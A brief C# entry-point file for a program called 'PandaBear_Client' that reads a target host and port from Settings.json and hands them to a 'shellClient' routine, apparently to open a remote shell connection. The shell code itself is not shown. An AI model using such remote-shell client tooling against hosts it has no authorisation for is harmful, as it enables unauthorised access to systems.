using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using CSL.Sockets;
using Newtonsoft.Json.Linq;

namespace PandaBear_Client
{
    class Program
    {
        private static string[] argGrabber()
        {
            JObject reader = JObject.Parse(File.ReadAllText("Settings.json"));

            List<string> toArray = new List<string>();

            toArray.Add((string)reader["target"]);
            toArray.Add((string)reader["port"]);
            toArray.Add((string)reader["data"]);
            toArray.Add((string)reader["name"]);

            return toArray.ToArray();
        }

        private static async Task MainAsync(string[] args) 
        {
            string[] toset = argGrabber();

            try
            {
                ServerInfo info = new ServerInfo(toset[0], toset[1], toset[2], toset[3]);

                Clients.shellClient(info);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Connection failed!");
                Console.WriteLine(ex.Message);
            }
        }

        private static void Main(string[] args)
        {
            MainAsync(args);
        }
    }
}
